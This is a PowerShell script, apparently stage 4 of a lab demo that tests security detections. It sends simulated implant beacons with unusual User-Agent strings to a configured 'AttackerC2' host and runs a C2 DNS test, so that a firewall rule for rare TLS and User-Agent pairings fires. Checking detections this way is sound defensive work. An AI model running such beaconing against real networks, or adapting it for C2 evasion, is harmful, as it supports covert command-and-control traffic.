<#
    Stage 4 (MIDDLE) - Rare TLS + User-Agent fingerprint : evasion
    ==============================================================
    The implant's HTTPS beacons carry an unusual pairing of TLS client + HTTP
    User-Agent - a rare combination to an external address that stands out from
    normal browser traffic.

      EAL alert : 'Abnormal communication with a rare combination of TLS and
                   HTTP User Agent'  (rule 7f213d7d)
      ATT&CK    : Command & Control / Exfiltration (TA0011/TA0010) /
                  Web Service (T1102), Exfiltration Over Web Service (T1567)
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_net.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

Write-Stage "STAGE 4 (C2 evasion): rare TLS/UA beacons to attacker $($cfg.AttackerC2)" "INFO"
$uas = @(
    "python-requests/2.19.1",
    "Go-http-client/1.1",
    "curl/7.19.7 libcurl/7.19 OpenSSL/0.9.8",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET4.0C)"
)
foreach ($ua in $uas) {
    Invoke-Http -Url "https://$($cfg.AttackerC2)/tls-beacon" -UserAgent $ua -Label "rare TLS+UA"
    Invoke-Http -Url "http://$($cfg.AttackerC2)/tls-beacon"  -UserAgent $ua -Label "rare UA (http fallback)"
}
Invoke-TestDns -Category "c2"
Write-Stage "STAGE 4 done. Expect FW NGFW: DNS-Security C2 + (once baselined) EAL 'Abnormal rare TLS+UA' 7f213d7d." "OK"
